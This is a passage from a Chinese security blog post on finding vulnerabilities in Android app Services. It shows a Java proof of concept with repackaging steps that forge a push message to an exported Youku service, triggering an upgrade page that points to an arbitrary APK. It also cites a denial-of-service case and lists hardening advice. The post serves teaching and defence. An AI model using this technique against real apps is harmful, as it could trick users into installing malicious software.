+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">我们可以发现从Intent从获取名为PushMsg的Serializable的数据，并根据其成员type来执行不同的流程，当type值为<span class="number">1</span>时，执行App的升级操作。升级所需的相关数据如app的下载地址等也是从该序列化数据中获取。升级的具体流程在com.youku.ui.activity.UpdateActivity中，简单分析后发现升级过程未对下载地址等进行判断，因此可以任意指定该地址。</span><br></pre></td></tr></table></figure>
+
+<p>漏洞攻击：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>创建一个Android App程序，在主Activity中的关键代码如下：</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">PushMsg</span> <span class="variable">pushMsg</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PushMsg</span>();</span><br><span class="line">pushMsg.type = <span class="number">1</span>;</span><br><span class="line">pushMsg.updateurl = <span class="string">&quot;http://gdown.baidu.com/data/wisegame/41839d1d510870f4/jiecaojingxuan_51.apk&quot;</span>;</span><br><span class="line">pushMsg.updatecontent = <span class="string">&quot;This is Fake&quot;</span>;</span><br><span class="line">		</span><br><span class="line"><span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">intent.setClassName(<span class="string">&quot;com.youku.phone&quot;</span>,<span class="string">&quot;com.youku.service.push.StartActivityService&quot;</span>);</span><br><span class="line">intent.putExtra(<span class="string">&quot;PushMsg&quot;</span>, pushMsg);</span><br><span class="line">startService(intent);</span><br><span class="line"></span><br><span class="line">其中PushMsg类不需要完整实现，只需要编译通过即可；</span><br><span class="line"><span class="number">2.</span>反编译优酷客户端的App得到smali代码，从中提取出PushMsg.smali；</span><br><span class="line"><span class="number">3.</span>反编译上述创建的APK文件，将原PushMsg类的smali文件替换为优酷中的PushMsg.smali文件，重新打包签名；</span><br><span class="line"><span class="number">4.</span>安装并运行重打包后的APK，会看到优酷的升级页面触发，如果设计的好的话，是可以诱导用户安装攻击者指定的APK文件的。</span><br></pre></td></tr></table></figure>
+
+<h3 id="4-拒绝服务攻击"><a href="#4-拒绝服务攻击" class="headerlink" title="4.拒绝服务攻击"></a>4.拒绝服务攻击</h3><h4 id="（1）原理介绍-3"><a href="#（1）原理介绍-3" class="headerlink" title="（1）原理介绍"></a>（1）原理介绍</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Service的拒绝服务主要来源于Service启动时对接收的Intent等没有做异常情况下的处理，导致程序崩溃。主要体现在给Service传输的intent或者传输序列化对象导致接收时候的类型传化异常。</span><br></pre></td></tr></table></figure>
+
+<p>Service拒绝服务攻击和Activity拒绝服务攻击的原理一样，可以参考我们上篇帖子</p>
+<h4 id="（2）漏洞复现-2"><a href="#（2）漏洞复现-2" class="headerlink" title="（2）漏洞复现"></a>（2）漏洞复现</h4><p>案例：<a target="_blank" rel="noopener" href="https://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2014-048028"><strong>雪球最新Android客户端存在空指针异常及信息泄露漏洞</strong></a></p>
+<p>漏洞描述：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">雪球客户端版本：4.1</span><br><span class="line">adb shell 下执行下面命令，虚拟机将崩溃。愿意在于空指针调用</span><br></pre></td></tr></table></figure>
+
+<p>攻击样例：</p>
+<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0010/5.png" alt="image-20210908160946499"></p>
+<h2 id="四、Service的安全防护"><a href="#四、Service的安全防护" class="headerlink" title="四、Service的安全防护"></a>四、Service的安全防护</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">安全防护：</span><br><span class="line">	（<span class="number">1</span>）私有service不定义intent-filter并且设置exported为<span class="literal">false</span></span><br><span class="line">	（<span class="number">2</span>）公开的service设置exported为<span class="literal">true</span>，intent-filter可以定义或者不定义</span><br><span class="line">	（<span class="number">3</span>）合作service需对合作方的app签名做校验</span><br><span class="line">	（<span class="number">4</span>）只被应用本身使用的service应设置为私有</span><br><span class="line">	（<span class="number">5</span>）service接收的数据需要谨慎处理</span><br><span class="line">	（<span class="number">6</span>）内部service需要使用签名级别的protectionLevel来判断是否未内部应用调用</span><br><span class="line">	（<span class="number">7</span>）不应在service创建（onCreate方法被调用）的时候决定是否提供服务，应在onStartCommand/onBind/onHandleIntent等方法被调用时做判断</span><br><span class="line">	（<span class="number">8</span>）当service又返回数据的时候，因判断数据接收app是否又信息泄露的风险</span><br><span class="line">	（<span class="number">9</span>）有明确的服务需调用时使用显示意图</span><br><span class="line">	（<span class="number">10</span>）尽量不发送敏感信息</span><br><span class="line">	（<span class="number">11</span>）启动Activity时不设置intent的FLAG_ACTIVITY_NEW_TASK标签</span><br></pre></td></tr></table></figure>
+
+<h2 id="五、实验总结"><a href="#五、实验总结" class="headerlink" title="五、实验总结"></a>五、实验总结</h2><p>本文对Android APP的service漏洞挖掘做了一个初步的总结，并且对service的工作原理做了一个初步讲解。一些样本漏洞可能比较老，作为初步学习使用，后续会陆续补充一些新的相关漏洞案例，很多service漏洞在android版本升级后，可能不复存在，所以这里只是初步的总结学习记录。</p>
+<h2 id="六、参考网址"><a href="#六、参考网址" class="headerlink" title="六、参考网址"></a>六、参考网址</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Android第一行代码</span><br><span class="line">https://github.com/WooyunDota/DroidDrops</span><br><span class="line">https://segmentfault.com/a/1190000011325759</span><br><span class="line">https://blog.csdn.net/NewActivity/article/details/103243638</span><br><span class="line">https://tech.meituan.com/2017/09/14/android-binde-kcon.html</span><br><span class="line">https://blogs.360.cn/post/android-app%E9%80%9A%E7%94%A8%E5%9E%8B%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A.html</span><br></pre></td></tr></table></figure>
+
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>安全后厨团队 |  微信公众号【安全后厨】
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="http://security-kitchen.com/2023/02/13/bug0010/" title="Android App漏洞之战（10）——Service漏洞挖掘详解">http://security-kitchen.com/2023/02/13/bug0010/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/" rel="tag"># 漏洞挖掘</a>
+              <a href="/tags/%E5%B7%A5%E5%85%B7/" rel="tag"># 工具</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2023/02/13/bug0009/" rel="prev" title="Android App漏洞之战（9）——Activity漏洞挖掘详解">
+      <i class="fa fa-chevron-left"></i> Android App漏洞之战（9）——Activity漏洞挖掘详解
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2023/02/13/bug0011/" rel="next" title="Android App漏洞之战（11）——Broadcast Recevier漏洞详解">
+      Android App漏洞之战（11）——Broadcast Recevier漏洞详解 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%80%E3%80%81%E5%89%8D%E8%A8%80"><span class="nav-text">一、前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%8C%E3%80%81Service%E6%BC%8F%E6%B4%9E%E5%88%9D%E6%AD%A5%E4%BB%8B%E7%BB%8D"><span class="nav-text">二、Service漏洞初步介绍</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-service%E5%9F%BA%E6%9C%AC%E4%BB%8B%E7%BB%8D"><span class="nav-text">1.service基本介绍</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%EF%BC%881%EF%BC%89service%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%9C%E7%94%A8"><span class="nav-text">（1）service的基本作用</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%EF%BC%882%EF%BC%89service%E7%9A%84%E5%BC%95%E5%85%A5-lt-%E7%BA%BF%E7%A8%8B%E4%B8%8E%E6%9C%8D%E5%8A%A1%E7%9A%84%E5%8C%BA%E5%88%AB-gt"><span class="nav-text">（2）service的引入&lt;线程与服务的区别&gt;</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%EF%BC%883%EF%BC%89service%E7%9A%84%E5%88%9B%E5%BB%BA"><span class="nav-text">（3）service的创建</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%EF%BC%884%EF%BC%89service%E7%9A%84%E5%90%AF%E5%8A%A8"><span class="nav-text">（4）service的启动</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-Service%E6%BC%8F%E6%B4%9E%E7%9A%84%E7%A7%8D%E7%B1%BB%E5%92%8C%E5%8D%B1%E5%AE%B3"><span class="nav-text">2.Service漏洞的种类和危害</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%89%E3%80%81Service%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90%E5%92%8C%E5%A4%8D%E7%8E%B0"><span class="nav-text">三、Service漏洞原理分析和复现</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E"><span class="nav-text">1.权限提升漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%EF%BC%881%EF%BC%89%E5%8E%9F%E7%90%86%E4%BB%8B%E7%BB%8D"><span class="nav-text">（1）原理介绍</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%EF%BC%882%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="nav-text">（2）漏洞复现</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-service%E5%8A%AB%E6%8C%81"><span class="nav-text">2.service劫持</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%EF%BC%881%EF%BC%89%E5%8E%9F%E7%90%86%E4%BB%8B%E7%BB%8D-1"><span class="nav-text">（1）原理介绍</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-%E6%B6%88%E6%81%AF%E4%BC%AA%E9%80%A0"><span class="nav-text">3.消息伪造</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%EF%BC%881%EF%BC%89%E5%8E%9F%E7%90%86%E4%BB%8B%E7%BB%8D-2"><span class="nav-text">（1）原理介绍</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%EF%BC%882%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-1"><span class="nav-text">（2）漏洞复现</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%94%BB%E5%87%BB"><span class="nav-text">4.拒绝服务攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%EF%BC%881%EF%BC%89%E5%8E%9F%E7%90%86%E4%BB%8B%E7%BB%8D-3"><span class="nav-text">（1）原理介绍</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%EF%BC%882%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-2"><span class="nav-text">（2）漏洞复现</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9B%9B%E3%80%81Service%E7%9A%84%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4"><span class="nav-text">四、Service的安全防护</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%94%E3%80%81%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93"><span class="nav-text">五、实验总结</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%AD%E3%80%81%E5%8F%82%E8%80%83%E7%BD%91%E5%9D%80"><span class="nav-text">六、参考网址</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="安全后厨团队"
+      src="/images/avatar.png">
+  <p class="site-author-name" itemprop="name">安全后厨团队</p>
+  <div class="site-description" itemprop="description">选择有时候比努力更重要</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">48</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">8</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">17</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/WindXaa" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;WindXaa" rel="noopener" target="_blank"><i class="github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://bbs.pediy.com/user-home-905443.htm" title="看雪 → https:&#x2F;&#x2F;bbs.pediy.com&#x2F;user-home-905443.htm" rel="noopener" target="_blank"><i class="gratipay fa-fw"></i>看雪</a>
+      </span>
+  </div>
+
+
+
+      </div>
+	  
+	  <div class="wechat_OA">
+		<span><b>公众号</b></span>
+		<br>
+		<!-- 这里添加你的二维码图片 -->
+		<img src="https://blog-1307040378.cos.ap-chengdu.myqcloud.com/blog-website/weChat.jpg" alt="二维码">
+	  </div>
+	  <div class="wechat_OA">
+		<span><b>知识星球</b></span>
+		<br>
+		<!-- 这里添加你的二维码图片 -->
+		<img src="https://blog-1307040378.cos.ap-chengdu.myqcloud.com/blog-website%2Fstar.png" alt="知识星球">
+	  </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 2022-12 – 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">安全后厨团队</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+<div class="theme-info">
+  <div class="powered-by"></div>
+  <span class="post-count">博客全站共184.3k字</span>
+</div>
+
+    <script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+    <span id="busuanzi_container_site_pv">总访问量<span id="busuanzi_value_site_pv"></span>次</span>
+    <span class="post-meta-divider">|</span>
+    <span id="busuanzi_container_site_uv">总访客数<span id="busuanzi_value_site_uv"></span>人</span>
+    <span class="post-meta-divider">|</span>
+<!-- 不蒜子计数初始值纠正 -->
+<script>
+$(document).ready(function() {
+
+    var int = setInterval(fixCount, 50);  // 50ms周期检测函数
+    var countOffset = 20000;  // 初始化首次数据
+
+    function fixCount() {            
+       if (document.getElementById("busuanzi_container_site_pv").style.display != "none")
+        {
+            $("#busuanzi_value_site_pv").html(parseInt($("#busuanzi_value_site_pv").html()) + countOffset); 
+            clearInterval(int);
+        }                  
+        if ($("#busuanzi_container_site_pv").css("display") != "none")
+        {
+            $("#busuanzi_value_site_uv").html(parseInt($("#busuanzi_value_site_uv").html()) + countOffset); // 加上初始数据 
+            clearInterval(int); // 停止检测
+        }  
+    }
+       	
+});
+</script> 
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
